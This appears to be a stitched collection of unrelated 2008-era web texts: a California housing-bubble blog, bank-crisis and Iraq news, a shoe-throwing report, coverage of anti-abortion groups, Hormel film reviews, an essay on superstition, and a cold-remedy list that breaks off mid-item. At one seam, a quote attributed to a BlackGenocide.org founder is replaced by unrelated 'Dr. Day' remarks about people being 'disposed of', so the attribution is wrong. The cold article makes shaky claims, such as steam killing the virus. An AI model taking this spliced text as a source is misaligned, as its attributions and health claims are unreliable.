Yet the problem is they are still doing the same mistake !
How so ?
For example , during these last few upsurges in sale they made it appear that it was somehow a gigantic jump .
No , if you pulled data back from 2000 where the bubble started , you would quickly see the “ upsurge ” was simply a trend back to normalcy .
You ’ll notice with the above chart that as time went on , many of the notice of defaults ( NODs ) started going into foreclosures .
This is significant .
If you look at say Q1 of 2005 we have nearly 17,025 ( NODs ) but practically no foreclosures .
Why ?
Anyone in trouble can just sell their home .
Simple .
Not the case anymore .
You may be wondering why NODs suddenly fell off in Q3 .
This as I have stated is because of SB 1137 which is simply a dull legislation requiring lenders to kick the can down the road a few more months .
It basically tells lenders , “ hey you .
Contact the borrower and tell them what ’s up .
Now go forth and collect . ”
Yet how are you going to squeeze cash out of a cash strapped California homeowner ?
That is why each subsequent bailout gets dumber and dumber on an exponential scale because consumers simply are financially strapped .
Another key chart to look at is the median price versus the California unemployment rate :
What you ’ll notice almost perfectly is the unemployment rate dropping sharply right at the peak of the bubble .
Right when the bubble burst , you see unemployment rising sharply .
So what came first , high unemployment or the peak price ?
No need for a chicken or egg debate but let us point out the obvious .
First , you ’ll notice that once the plateau of peak prices was reached it stayed high into 2007 .
Unemployment started creeping up in 2006 .
Why ?
Well many builders were getting out of dodge while the going was good while many people were still pretending they lived in Wonderland hoping a borrower would jump into the rabbit hole and pay their outrageous price .
This above chart is crucial since the trend is almost perfect now .
That is , higher unemployment will lead to lower prices .
That is normally how housing markets play out during tough times .
This case is unique in that California built an industry around this bubble with construction , finance , home building , equity withdrawals , and industries that catered to the housing bubble .
Now that the bubble is gone there is n’t enough other jobs in the non-bubble economy to absorb these people back .
That is why I just do n’t see how California gets out of this bubble until 2011 .
Maybe nationwide we may see a price bottom in 2009 or 2010 but certainly not for us .
The above charts paint a rather clear picture of the longer term trend .
But how are things today ?
Well let us look at the current market snapshot :
This next chart has data from September of 2007 .
You ’ll notice an upsurge in July of 2008 but you should ignore that because I added San Diego county distress sales at this point .
However , the trend is unmistakable .
Inventory is falling and distress sales are rising .
The only reason you have seen then taper off recently again is because of the legislation .
But even then , you can see how tiny this is even when it is simply pushing problems 1 or 2 quarters away .
This chart also shows that psychologically those that do not need to sell are pulling their homes off the market .
Why in world would you sell right now ?
This is a horrid market .
Yet , waiting until a few months down the road you may actually lose even more .
Think of it this way .
The chart with price above shows massive gains since 2000 .
That is across all counties .
A high percentage of people that own bought before this time so they would still make a profit today .
Now you have people willing to wait hoping next summer the bubble makes a triumphant return .
Or you can sell now .
This chart above tells you one major thing .
Many think they ’ll be able to get higher prices tomorrow .
Yet distress properties keep hitting the market because these are forced sales .
I hope the above gives you a deep perspective of Southern California and hopefully provides you some insight in where we are heading .
We have n’t seen this kind of economic turmoil since the Great Depression so it is hard to say when we will bottom out .
Yet one thing is certain and that is we are going to go down in the history books for generations to come right next to those beautiful tulip bulbs .

Mervyn King has called for " more boredom " in UK banking UK Prime Minister Gordon Brown has warned action is needed to prevent the current financial malaise spreading .
Mr Brown said the first priority was " to stop the contagion to other countries , including in eastern Europe " where there were " problems emerging " .
He added the IMF would have to create a new fund to help struggling nations .
It comes as the Bank of England said the world 's financial firms had now lost £ 1.8 trillion ( $ 2.8 trillion ) as a result of the continuing credit crisis .
It also warned that 1.2 million homeowners in the UK now faced going into negative equity if house prices continued recent sharp falls .
The Bank gave the figures in its latest bi-annual Financial Stability Report .
UK Prime Minister Gordon Brown has called on China and oil - rich states to contribute to an IMF bail - out fund .
The idea is that the International Monetary Fund would be able to offer " substantially more " than the $ 250 bn that it has at the moment to fund countries hit by the downturn .
" We must act now , we must set up the fund as quickly as possible , " Mr Brown said , adding that he would discuss it with Chinese and Gulf leaders later in the week .
' Fundamental rethink '
Warning that UK banks could now face stricter measures to avoid a repeat of the current credit crisis , the Bank said there may be " a need for a fundamental rethink of how to safeguard against systemic risk " .
Looking further ahead , we need a fundamental rethink of how to manage systemic risk internationally

BBC Business Editor Robert Peston says global taxpayers have now spent £ 5 trillion to shore up the world 's banks .
The UK recently announced it would be putting a total of up to £ 37bn into Royal Bank of Scotland , HBOS and Lloyds TSB .
The Bank of England 's new estimate on global losses is double the estimate that it published in May .
Bank deputy governor Sir John Gieve said the " fundamental rethink " meant increasing capital and liquidity requirements at institutions .
' Stronger restraints '
According to the Financial Stability ( FSR ) report , the UK banking industry expanded over - rapidly when times were good , but lacked a solid foundation to cope when things turned bad .
Mr Gieve said : " Looking further ahead , we need a fundamental rethink of how to manage systemic risk internationally .
" We need to establish stronger restraints on the build - up of risks in the financial system over the cycle with the dangers they bring to the wider economy . "
Measures mooted in the FSR include a " leverage ratio " , which would peg back the growth in banks ' balance sheets to the size of their capital .
Another suggestion is " dynamic provisioning " , which would encourage banks to build up their reserves or take out insurance against having to seek funding injections .
' Funding gap '
The report points out that in 2001 , UK customer lending was comparable to customer deposits .
But by the first half of 2008 the surplus of lending over deposits - " the customer funding gap " - was £ 700 bn .
The report said banks should strengthen their finances by increasing customer deposits , holding more assets that are easy to sell and reducing reliance on wholesale money markets .
Last week Bank governor Mervyn King said the British banking system had been closer to collapse earlier this month than at any time since the start of World War I .
He also said that a " little more boredom " would be no bad thing for the industry .
The US Federal Reserve is to begin a two - day meeting on Tuesday to decide whether to reduce interest rates again .
The Fed is widely expected to cut rates to 1 % from 1.5 % , which would take rates to their lowest level since 2001 .
Analysts expect that this move will lead to further cuts in interest rates in European banks .

Bush Iraqi shoe attack :
Why did n't the Secret Service take a loafer for the president ?
They are supposed to be willing to take a bullet for the president .
But why were n't the Secret Service close enough to take a shoe ?
Watching video of Sunday 's incident where an Iraqi journalist hurled his shoes at George Bush during a press conference ( below ) , the person who is quickest to react to the attack is Bush - surprisingly nimble on his feet for 62 .
And journalist al - Zaidi has time to hurl not one but two shoes at the president before any member of the Secret Service even gets close .
Click below to see the video
President Bush ducks to avoid the incoming ' size 10 '
The Iraqi journalist surprises the room as he launches his shoes at Bush
After the second shoe is hurled - and al - Zaidi is being tackled to the ground ( note , by journalists , not Secret Service agents ) one agent does finally run towards Bush .
But the president then holds his hand up to hold him off , apparently having already had time to ascertain for himself that his life is not in danger .
Had al - Zaidi been armed with anything more lethal than a loafer , U.S. media websites have pointed out , everyone would be asking :
What went wrong with the elaborate system that 's supposed to protect the president ?
Some websites have already argued ' nothing ' .
The press conference was taking place in Iraq - not , pundits agree , the safest place for George Bush on earth - but journalists were not even aware that the president would be attending the press conference as his trip to Baghdad was unannounced .

The conference was also being given in a secure room where , U.S. media websites such as Salon.com have argued , journalists were presumably taken through security before entering .

' Unless the security standards are looser in Iraq than they are in Washington ( which seems hard to believe ) , by the time al - Zaidi was close enough to Bush throw anything at him , he 'd already gone through a metal detector and had his bag and the contents of his pockets inspected , ' commented Salon.com .
' Since he did n't have anything that seemed too dangerous , the Service probably wrote him off as relatively harmless . '
' We 'll be our own harshest critic regarding this incident , ' Secret Service spokesman Ed Donovan told U.S. media publisher McClatchy yesterday , ' and we 'll make any appropriate changes to security . '
Donovan said , however , that agents on the scene knew that everyone in attendance had been screened for weapons and that they appeared to have taken the ' appropriate level of action ' .

However ex-agent Patrick Lennon said : ' I thought they would have responded after the first shoe .
' Thank God , Bush apparently played a little dodge ball when he was younger .
' His reflexes are quick .
I was proud of him .'
And , as an editorial in Slate.com has pointed out , the incident has reignited the debate on Iraqi security .
Those against the war are claiming al - Zaidi's attack is ever more proof that the U.S. should never have gone in to Iraq .
However others have pointed out that the fact al - Zaidi was able to launch his attack and survive is testament to the regime change implemented by the United States :
Had he thrown his shoes at Saddam Hussein , many claim , he would have been shot on sight .
Al - Zeidi has since been arrested and charged
The brief , unannounced , visit was meant to showcase recent security gains in Iraq , with Air Force
One landing in broad daylight instead of under cover at night .
With Al - Zaidi now in military custody and , according to his brother , being beaten by authorities , the strength of that argument may yet be tested .
However he is still being hailed as a hero in the Arab world .
A Saudi businessman has offered $ 10 million for one of the shoes , Saudi television has reported .
Hasan Mohammad Makhaffa , who owns lands and properties south - west of Saudi Arabia , claims the sum he offered is an auction ' starting price ' .
Makhafa , 60 , a retired teacher said : ' I consider the shoes the most precious of all my real estate and property , and I will leave them behind as inheritance for my children , to become the shrine , a Medal of Freedom . '
Meanwhile , thousands of Iraqis took to the streets again today to demand the release of the journalist .
Mr Zaidi had yelled ' This is a farewell kiss , you dog .
This is from the widows , the orphans and those who were killed in Iraq , ' as he hurled the footwear during a press conference in Baghdad on Sunday .
An Iraqi government official says the journalist has been handed over to the Iraqi military command in Baghdad .
Al Zaidi's brother claims the reporter has been beaten in custody .
Muntadar al - Zaidi has suffered a broken hand , broken ribs and internal bleeding , as well as an eye injury , his older brother , Dargham , told the BBC .
In the Muslim world , showing the sole of your shoe to someone , or throwing it , is a sign of extreme disrespect .

Iraqis hit a toppled statue of Saddam Hussein with their shoes after the 2003 invasion .
Mr Zaidi's TV station , Al Baghdadia , screened repeated pleas for his release , while showing footage of explosions and playing music that denounced the U.S. in Iraq .
Al Jazeera TV interviewed Saddam 's former chief lawyer Khalil al - Dulaimi , who offered to defend Mr Zaidi and called him a hero .
In Baghdad 's Sadr City , thousands of supporters of radical Shia cleric Muqtada al - Sadr burned U.S. flags and called for the release of Mr Zaidi .
' Bush , Bush , listen well : Two shoes on your head , ' they chanted .
In Najaf , a Shia holy city , some protesters - threw their shoes at a U.S. patrol .
Responses in other countries were ecstatic .
' Al - Zaidi is the man , ' said Jordanian Samer Tabalat .
' He did what Arab leaders failed to do . '
In Libya , a charity group headed by leader Muammar Gaddafi 's daughter Aicha , said it planned to give Mr Zaidi an award for courage .
When asked about the shoe incident shortly afterwards , President Bush made light of it , joking that he thought the shoes were about size ten .
Demonstrators chant slogans as they hold up shoes during a protest in Mosul , north of Baghdad , December 16 , 2008
' It does n't bother me , ' he added .
' It 's like going to a political rally and have people yell at you .
It 's a way for people to draw attention . '
Bush smiled uncomfortably and Maliki looked strained in the moments following the attack .
Other Iraqi journalists apologised on behalf of their colleague .
When Mr Bush met with reporters later aboard Air Force One , he had a joke prepared : ' I did n't know what the guy said but I saw his " sole " . '
Later , he said : ' I 'm going to be thinking of shoe jokes for a long time .
I have n't heard any good ones yet . '
At the news conference Mr Bush declared : ' The war is not over .
There is still more work to be done . '
The man is bundled away by security personnel
On Sunday , he applauded security gains in Iraq and , referring to a security pact paving the way for US troops to withdraw , he said that just two years ago ' such an agreement seemed impossible . '
' There is hope in the eyes of Iraq 's young , ' Mr Bush said .
' This is the future of what we 've been fighting for . '
Al - Maliki said : ' Today , Iraq is moving forward in every field . '
For the first time Bush landed in Air Force One at Baghdad International Airport in broad daylight and during the visit he also ventured outside the security of the Green Zone to visit al - Maliki in his palace .
The President smiles during an official meeting with his Iraqi counterpart Jalal Talabani
The unannounced visit came just 37 days before Bush gives way to President - elect Barack Obama , who has vowed to end the Iraq war .
' The work has n't been easy but it has been necessary for American security , Iraqi hope and world peace , ' Bush said .
' I 'm just so grateful I had the chance to come back to Iraq before my presidency ends . '
His visit followed the recent signing of a U.S. - Iraq security agreement that requires American forces to withdraw by the end of 2011 .
Almost 150,000 U.S. troops remain in Iraq fighting a conflict that is intensely unpopular in the United States and across the globe .
More than 4,200 American servicemen and women have died and the war has cost U.S. taxpayers $ 576 billion ( £ 385 billion ) since it began five years and nine months ago .
Bush 's national security adviser , Stephen Hadley , said the new security pact between the U.S. and Iraq was unique in the Arab world because it had been publicly debated , discussed and adopted by an elected parliament .
Incoming President Barack Obama has promised to withdraw U.S. troops from Iraq
Iraq watchers say last year 's surge in U.S. military forces has led to improved security in the country .
Last month , attacks fell to the lowest monthly level since the war began in 2003 .
However , there were at least 55 deaths on Thursday in a suicide bombing in a restaurant .
Mr Bush said in a recent interview with an American TV network that the ' biggest regret ' of his presidency was flawed intelligence that Iraq had weapons of mass destruction .
He used that intelligence as a key justification for going to war , but no such weapons were found .
Barack Obama has promised to bring all U.S. combat troops back home from Iraq a little over a year into his term , as long as commanders agree a withdrawal would not endanger American personnel or Iraq 's security .
It 's expected the incoming Democratic administration will shift troops from Iraq to Afghanistan , where a resurgent Taliban is causing problems for coalition forces .
Commanders in Afghanistan want at least 20,000 more personnel to bolster their ranks and improve security , but can not get them unless some leave Iraq .
If anyone thought that right - wing anti-choice groups were going to spend any time licking the wound inflicted by the last election in which they saw several states reject their efforts to restrict the right to chose , think again :
“ The election forces the pro-life movement to go back to what we do best — local grass - roots organizing , ” said the Rev. Patrick J. Mahoney , director of the Christian Defense Coalition .
“ We will not go silently into the night . ” …
The overall outcome “ brings about feelings of great disappointment , of anger , ” said the Rev. Frank Pavone , national director of Priests for Life .
“ But that disappointment and anger are forms of energy .
… I believe a lot of people on the sidelines for last eight years will now get engaged . ”
Pavone predicted that activists would stage more mass demonstrations and abortion - clinic vigils .
He also said the election results shed light on the movement ’s weak points , and would prompt new efforts to register anti-abortion voters and mobilize clergy to be more outspoken in future campaigns …
“ We will do everything to be sure [ the Freedom of Choice Act ] fails — the damage it would do to the pro-life movement would be immeasurable , ” said Mahoney .
“ On the scale of 1 to 10 , that ’s No. 11 of what our job is . ” …
“ Any time you have a loss like that , you have an opportunity to reassess and come back stronger , ” said Charmaine Yoest , president of Americans United for Life .
“ If they want to see this as a big loss that will set us back , that ’s OK .
Our people are very energized , and ready for Round Two . ”
This sentiment seems to be sweeping the Religious Right , with Students for Life of America pledging to be unstintingly vigilant and Deacon Keith Fournier vowing to be a part of a “ massive resistance ” that will not only fight reproductive choice but will end the “ culture war ” through mass conversion :
We seem to be at war within when we need to join together as one strong voice for life .
The real source of the hatred of life is the Devil Himself .
The challenge which those whom the late Servant of God John Paul II called “ the people of life ” face at this crucial time in the history of the West is nothing new .
We have been here before in our 2000 year history .
The Christian Church goes into Cultures of death and transforms them from within .
We can – and we must – do it again in the Third Millennium .
Ours is not really a call to a “ Culture War ” but rather a call to the Conversion of Culture through the conversion of minds , hearts , and lifestyles which will then lead to a transformation of the social structures of governance and way we live our lives together .
In fact , it looks as if the Right is almost welcoming the new Obama administration , sensing it will provide an opportunity for them to mobilize and energize their base as part of new “ resistance movement ” :
Wendy Wright , president of Concerned Women for America , said , “ I knew , moments after the election results came in , that I was now part of the resistance movement . ”
As part of its “ movement , ” CWA has launched a nationwide telemarketing advertising campaign .
In the ad , Wright says , “ We face a president and Congress more hostile to unborn children , to marriage , to religious freedom , to free speech , to protecting our country than has ever existed in our history . ”
According to Wright , the ad generated an immediate response of calls from religious conservatives asking “ what they could do ” to help , NPR reports .
Religious conservative leaders also have been scrutinizing Obama ’s speeches from the campaign trail for messages they can use to rally their base , NPR reports .
In particular , they have publicized a speech Obama made last year to the Planned Parenthood Federation of America in which he said , “ The first thing I ’d do as president is sign the Freedom of Choice Act . ”
The act — which would need congressional approval before Obama could sign it — would eliminate most federal and state restrictions on abortion .
Gary Bauer , president of American Values , said of the speech , “ I found myself thinking , ‘ My goodness , I ca n’t believe he ’s going to make it this easy for us to rally our troops to get off the mat and get back to work . ' ”
And Clenard Childress , founder of BlackGenocide .
Org , goes so far as to declare that the election of Barack Obama was the best thing to ever happen to the anti-choice movement :
" Some of you will think I 'm talking about Communism , " Dr. Day told the assembly .
" Well , what I 'm talking about is much bigger than Communism ! "
He indicated that there is much more cooperation between East and West than most people realize .
He was free to speak at this time because " ... everything is in place and nobody can stop us now . "
When the new system takes over , people will be expected to sign allegiance to it , indicating that they do n't have any reservations to the old system .
" There just wo n't be any room for people who wo n't go along .
We can't have such people cluttering up the place so such people would be taken to special places and disposed of humanely . "
They would not create martyrs .
" People will just disappear . "
Perhaps one of the most disturbing films in the Prelinger collection .

This is Hormel is superb in every way - it engages children to have have an interest in their food , it has very well framed photography - the wiener packing line is brilliantly composed for example , it is clearly narrated with no cheesy 50yr old jokes to make you cringe , there 's ample coverage of each product from start to finish , it 's honest about which meat cuts are used and therefore the likely quality & content - indeed it proudly shows that gelatine is nothing but fat [ and skin ] and that all our yummy jellies are full of it ! , plus it is just so thoroughly enjoyable - warm , cosy nostalgia [ nice music too ] ... and I 'd rather eat anything shown in this film than the mechanically recovered connective tissue crap masquerading as meat many less scrupulous companies now hawk - exploiting the laxity of various legal meat definitions to do so .
In answer to an earlier review - ' No ' it does n't have any slaughter in it , you 're right .
It does n't hold back with it 's ' Beef Operations ' footage though ...
AND there is a very good reason it does n't have slaughterhouse footage in it - Ferris Furtney had already made a film for Hormel which focused solely on Hormel 's livestock purchasing and slaughtering activity , which was available to public groups upon request .

Besides , would you really expose even the most well adjusted child to a tour with up close views of cattle being killed with a bolt gun , or hung to bleed afterwards ?

The person who wrote that probably does n't think twice about pulling on their leather shoes , grabbing their leather wallet , driving to the multiplex sitting on leather car seats and watching simulated torture and dismemberment in ' Saw , part 943 ' , yet somehow actually knowing and seeing how your food gets on your plate is taboo ?!

People should see how their food is made .
If mechanized slaughter and meat processing really does bother people , they probably should n't be eating its results .
This video just ended up making me hungry though .
The only bothersome part ( for me ) is that as a human factors and safety engineer , some of those machines look like they were just waiting to take an arm off ( or steam it , or crush it - major lack of machine guarding in some areas ! ) , and some of those awkward hand carving maneuvers look like RSI ( repetitive stress injury ) hell .

Some day they will free the MP4 codec for the rest of us .
Also the MPEG file ( 845 mb ? ) it does n't play either .
So to be fair and to trumpet the cause of meat eating , I can only give 4 stars .

But what happened ?
Actually , I think its a pretty good film .
If made today , I sure it would be changed a lot .
Mr. Rugg 's hat is a classic of headwear .
But the question is , at the end of the movie when the boys and Mr. Rugg are leaving , Mr. Rugg 's hat is nowhere to be seen .
Did it fall in the weinnie vat and is still hanging out in the back of some jr. high walk - in food locker ?
Just wondering in Texas

This ' Hormel Film ' ( according to the end titles ) runs over half an hour long , and it goes into painful detail of all the things that Hormel does .
It shows all the different types of food that Hormel makes , and you get to see Mr. Rugg 's RIDICULOUS hat !
I did not really find this film that disturbing ... the more disturbing film is the one of the Kosher Slaughter on this website .
I still thoroughly enjoyed this film ... some great processing shots here !

Subject : A must - see for those who eat food !
I think anyone who eats food , especially meat , should watch this film .
It shows what people have become extremely removed from ... where the food they eat comes from , as well as how it 's ( or rather used to be ) prepared .
Considering that most folks do n't know where on the hog bacon and come from , this can be amazingly educational .
For those who are weak - stomach types , this may even help finally push you to vegetarianism !
While it is a bit dated ( nobody objects to young boys seeing the truth about what they eat ) it is still a viable useful film .
In all , a great educational show !

Because this was a promotional video , a lot of the processes are left out .
Most notably , we skip from seeing a queue of live cows to a hanging carcass .
I think some " animal rights " campaign footage would be better placed to show the negative side of the story .

Kids !
A word of advice for you ...
Do n't you dare ask your dad to take you on a trip to the Hormel Plant !
Otherwise , your dad will accompany you in a ridiculous bowler hat that looks straight from a halloween kit , while you watch pig carcasses get ' disassembled ' !!
Shoulders to the ham department !
Fat to the gelatin department !
Pigs feet to the .. pig 's feet department !
( They 're a delicious delicacy ! ) .
Really loved the cow hide removal demo , yum .
As many reviewers have pointed out , this film has the bubbliest chirpy music for a film about pig carcasses ever made .
Bonus points for the cheap cheap title cards !
This is a MUST SEE on this site !!

On Superstition
Early humans looked to the sky and invented stories explaining the intricate machinations of gods and monsters , heroes and heroines , warriors and poets .
They created myths , stories , and legends to account for the workings of these mysterious , brilliant points of light .
A single dot in the heavens could represent the most epic of battles .
A pair of stars could somehow contain within them the entire contents of both the Iliad and the Odyssey .
This was all possible because early man 's free - time allotment did not include the mind - numbing wonders of back episodes of VH - 1's " The Flavor of Love . "
Stories and explanations were extended and imposed upon everyday occurrences like the rising and setting of the sun , moon phases , tides , weather patterns , and why Thag repeatedly refused to return any flint tools he borrowed .
As successful pattern - seeking animals , we unfortunately inherited a side effect of finding patterns in occurrences where no structured systems exist .
Luckily , our early progenitors gained far more than they lost by creating these myths and fomenting their superstitions .
Seasonal structure was maintained by gazing at the stars and relying on their immutable , dependable permanence .
Yet , these incredible tales describing natural phenomena could never have begun to approach the truth .
How could these distant ancestors have imagined that the materials composing their celestial ornamentations were the very same materials composing their everyday terrestrial experience ?
To think that the elements and atoms at the heart of an unimaginably distant star are identical to the amalgamated parts of our very own selves was beyond the capacity of a primitive mind .
In many ways , it still is beyond the capacity of the human mind .
To realize that we are literally made of star stuff should inspire more awe and reverence than countless tales of hunters , chariot - riding warriors , fantastic creatures , or snake - coiffed babes .
As modern descendants of these pattern - seeking storytellers , we often forget that we are biologically identical to them .
The anatomical composition of their brains and bodies exactly matches ours ; it 's no wonder that so many of us find it easy to succumb to the effects and pressure of superstition .
I propose that every step of our species ' cultural advancement has been due to the shedding of this superstitious influence , and that vigilance and effort are required to control the consequence of hundreds of years of evolutionary conditioning .
Arthur C. Clarke once posited that any sufficiently advanced technology is indistinguishable from magic .
He also wore Nehru jackets so you know he was telling the truth .
Imagine what our distant cousins would think upon seeing the workings of an iPhone , or the internet , or wireless remotes , or television , or a fountain pen , or even a Slinky .
To them , these pocket miracles would be just as difficult to comprehend and explain as a solar eclipse or a hurricane , and would therefore be relegated to the vagaries of magic .
We however , look at these leaps and strides of technology and become inured to the real sorcery of these implements .
It 's an ever shrinking gap from the recently inconceivable to the newly mundane .
Lest we forget -
We can actually predict the future .
We know - to within tenths of a second - when the sun will rise and set for the next 10,000 years .
We can tell when Halley 's Comet and Comet Encke will return , and we know precisely when hundreds of eclipses and celestial events will happen .
We can actually treat disease .
One ingests the tiniest of pills and a variety of ailments and symptoms are treated .
The use of X - rays , CAT scans , and MRIs lets us peer into the inner workings of the body and painlessly diagnose and treat ailments .
Polio is no longer the unavoidable , crippling disease it once was .
We can actually fly .
Using harnessed principles of air pressure and dynamics , we can soar thousands of feet into the sky while safely and reliably speeding along at hundreds of miles an hour , all while watching a lousy movie .
We can actually communicate across vast distances ... instantly .
Telephones , radio , television , cell phones and the internet have completely redefined what communication means .
There is no need for telepathy when one has the world 's largest wireless network .
We can actually go to the Moon , or Mars , or Saturn , or soar outside our own solar system .
We have walked on the lunar surface , and machines designed by man have broken the very boundaries of our local space .
To many , these inventions and principles quickly become common , and they search for extended substance and meaning in shadow and hazy hyperbole .
They place unearned value in the insignificance of coincidence , and ignore the practical miracles that surround us .
They quickly forget that all of these inventions have been made possible by the rejection of superstitious thought .
Ben Franklin said that anger is never without reason , but seldom with a good one .
I hope that as we reject superstition we do n't search to be angry , but that we channel our anger when our reasons are good .
A mature civilization should revel in its own indignation at the deleterious effects of superstition .
Growing up is not selling out .
It 's simple to look at our distant history and question - or even ridicule - the various beliefs of past cultures .
How easily we can mock those who prayed to a dog - headed god .
How easily ( and rightly ) we can cringe at the ceremonial brutality of sacrifice .
How easily we can look down at the hierarchy of racism , sexism , and ageism entrenched in many of these past cultures .
How easily we can look back in shock and amazement at the popularity of flared pants .
Conversely , how difficult it is , to point a judgmental finger back at ourselves , and ponder what future generations might think of our particular set of superstitions .
What current ideas and concepts of love , race , tolerance , knowledge , and value will eventually embarrass us ?
Mark
Twain once lamented that the Church has opposed every innovation and discovery from Galileo 's time down to his own .
I would extend that not only the Church , but dogmatic thought from religious and non-religious magesteria have opposed ( however mistakenly and innocently ) every significant advancement of humanity .
The progress of innovation has often been stymied by the ideology of traditionalism .
Variations on superstitious thought have been used to explain and condone the denial of woman 's suffrage , the limiting of human rights , and even the trafficking of human chattel ... ideas that today are indefensible .
Perhaps it is a testament to the human animal that we as a species can quickly change our expectations of behavioral norms .
What at one time could be thought of as mundane can , in mere generations , be viewed as barbaric .
BUT - why do we easily forget and excuse the impetus and source of these beliefs ?
How often do espousers of dogma backtrack , apologize , and try to explain away past indiscretions through historical context ?
Why not question the maxim itself ?
It took the Vatican 359 years to admit they were wrong about Galileo .
It took science less than 20 years to figure out that Stephen Hawking was wrong about black hole radiation .
One of the folks who figured out that Stephen Hawking was wrong ?
Stephen Hawking .
That 's why he 's being sacrificed inside the Large Hadron Collider for blasphemy .
Despite such a difficult superstitious - laden history , humanity has inched forward , gaining speed , improving its pace with every step .
With clear thinking , exposure to centralized sources of knowledge , and access to the principles of science , we 're slowly losing the encumbrance of superstition .
As the weight is lifted , we marvel at the load we once carried .
The rationale for slavery , bigotry , sexism , fear , and countless other beliefs becomes inexcusable under the welcoming glow of science 's reasoned illumination .
We 've arrived at a time where humanity must mature and grow out of its awkward adolescence ; but there is no need to ever lose that childlike sense of wonder and amazement .
Knowing how a clock works does n't make one appreciate the passing of time any less .
Learning that the sun is composed of hydrogen and helium does n't take away from the beauty and majesty of a sunrise .
Knowing that a complex system of wires , computers , and micro processors is required to transport your voice over a satellite - based network could never diminish the impact of hearing that there will indeed be a new Ozzy Osbourne record .
Thomas Jefferson wrote , " Enlighten the people generally , and tyranny and oppressions of body and mind will vanish like evil spirits at the dawn of day . "
The last century , sometimes quite painfully , has proven his words to be true .
Humanity is slowly starting to realize that any society that attempts to impose a structure of disseminated knowledge , with limited exposure to new ideas and concepts , is ultimately fighting an un-winnable battle .
Regrettably , it often feels as though the superstitious get all the press .
Ironically , the medium which they use to communicate has , from its inception , been reliant upon the precepts of science .
The fact that a preacher or mullah can castigate the evils of secularism while using a satellite feed never ceases to amaze .
Why has the past century been such an incredible time of change ?
It 's due to the speed in which unfettered knowledge and reason has advanced .
It 's due to the quantitative , self - correcting nature of science .
It 's due to our unrelenting thirst for information .
It 's due to the ability to store , retrieve , share , and build upon that information .
It 's due to the seemingly limitless capacity for humans to think and conceive ideas .
And yes , these ideas can sometimes bear truths which can be disquieting .
It 's been said that progress has never been a bargain , but ultimately it has to be seen as worth the price .
Knowledge , no matter how uncomfortable , is never so painful as to outweigh ignorance .
The shedding of superstitious thought - ALL superstitious thought - could ultimately be the process that allows the luminescence of the stellar material within us to shine .
And perhaps for the first time , both our ancestors and descendants would be equally and unequivocally proud .

US Senator John McCain has said he believes that if Pakistan does not act against individuals and groups linked to the Mumbai terror attacks , it could be a " matter of days " before India carries out surgical strikes against such elements .
There is enough evidence of the involvement of former Inter - Services Intelligence officers in the planning and execution of the Mumbai attacks and terrorist training camps are still operational in Pakistan , McCain told a small group of senior Pakistani journalists at an informal lunch in Lahore on Saturday .
Ejaz Haider , a senior editor with the Daily Times group , quoted McCain as saying that he believed it could be a " matter of days " before India carried out surgical air strikes if Pakistan did not act on the evidence provided to it on elements linked to the attacks .
McCain also said that the terrorist training camps were being emptied " as we speak " , Haider told Dawn News channel .
Referring to the terror training camps as " red dots on the map " , McCain indicated that their number had increased since the time the US launched its campaign in Afghanistan in the wake of the 9/11 attacks .
McCain , who unsuccessfully contested the US presidential election , arrived in Pakistan with two other senior Senators on Friday after a brief visit to India .
Referring to his meeting with Prime Minister Manmohan Singh , McCain said the Indian leader , who is not easily ruffled , had appeared visibly angry .
In a report in the Daily Times , Haider wrote McCain had said that if " Pakistan does not act , and act fast , to arrest the involved people , India will be left with no option but to conduct aerial operations against select targets in Pakistan " .
McCain said this is what he and the other Senators were told by Manmohan Singh , who , as McCain put it , was " reeling from the shock " of the attacks .

There are simple and effective ways to cure cold , the most popular virus infection disease .
Most people get the cold virus 2 to 4 times a year .
Children are even more prone candidates to cold , since statistics show that children fall « victims » of virus infection at least 6 to 10 times a year .
Cold is also the most common reason for visiting the doctor .
The common cold usually lasts for one week , although it may be extended for up to 2 weeks , it can be cured without treatment .
If you notice that your cold lasts more than two weeks , then it is something serious and you should visit your doctor .
The cold virus comes in about 200 different forms .
We can get the cold through breathing , handshaking , kissing or touching .
Contrary to what most people think , we do not get the cold because of climate changes , or from poor nutrition or exercise .
[ See also 30 Medical Myth Busters you must know ] .
Statistics also show that people who are suffering from asthma or allergies are more likely to be infected by the cold virus .
Stress is also one of the reasons we get the cold .
There are things we can do and measures to take in order to cure cold .
This article gives an overview of 10 simple actions for a fast treatment from cold .
The most common symptoms of cold are :
Runny or Blocked nose
Cough
Sneezing
Sore throat
Fatigue
Diminished sense of taste and smell
Congestion
Watery eyes
Low Fever
Cold prevention techniques
To reduce the chances of getting the cold virus you can follow these simple rules :
Wash your hands regularly – and always before meals or before touching your eyes and your mouth .
Disinfect surfaces that can keep germs such as handrails and handles .
Try to avoid people that have the cold virus
Avoid being indoor with a lot of people , especially during the periods where virus diseases are on the rise .
10 Ways to cure from cold
1. Consume many liquids
As a first cure from cold try to consume a lot of water , juices and drinks ( e.g. Tea and herbs in general ) .
Liquids prevent the « drying » of our throat and nose , they help the mucous membranes glands to remain open and so it is easier to clean .
Liquids are also valuable when you have fever .
In this case there is increased risk of loss of liquids with dehydration .
In addition , the hydration of the body contributes to the removal of toxins produced from dead cells , which increases it ’s ability to fight the virus .
2. Avoid coffee and alcohol
Try to avoid drinks containing caffeine and alcohol because those substances tend to dehydrate our body and this is not what we want while we are cold .
3 . Water vapour and hot baths
Water vapour and hot baths are the most common home cures for cold .
Some people are standing in the bathroom with running hot water ; others inhale the vapour over a pot with boiling water .
It is believed that the steam can facilitate congestion .
The virus is also susceptible to very high temperatures , so it is possible that the steam can « kill » the virus through the nasal cavities .
4. Hot Soups
Many people consider a warm soup as the best cure the cold .
The advantages of such a traditional cure comes from the broth , which keeps the body hydrated and it also helps with the vapour .
It is therefore likely that any kind of hot broth will bring the same benefits .
Research made for the consumption of chicken soup while in a cold showed that the ingredients of chicken soup can actually reduce the swelling of the nasal cavities and help in the faster cure from common cold .
Also chicken soup can give the protein from chicken , a substance necessary for our body to build antibodies to fight viruses .
5 . Use a humidifier
These devices are a good method to make more humid air .
This may help to keep nasal cavities in liquid form and thus avoid the blocking of the nose .
When using the humidifier make sure to clean them regularly to block the possibility of transferring mould in the air .
6. Rest
One of the most important factors in getting cure from cold is a good sleep and generally relaxing .
You need to get plenty of rest in order for your body to resist the cold virus better , faster and more efficient .
If you have fever you should definitely stay home , switch off your mobile and try to relax .
Most people tend to try and overcome cold with out resting .
Experts ’ advice is to stay at home and relax for two days in a warm environment .
Typical temperature could be 24 - 25 Celsius ( 75.2 F ) .
7 . Wash your mouth with salt water
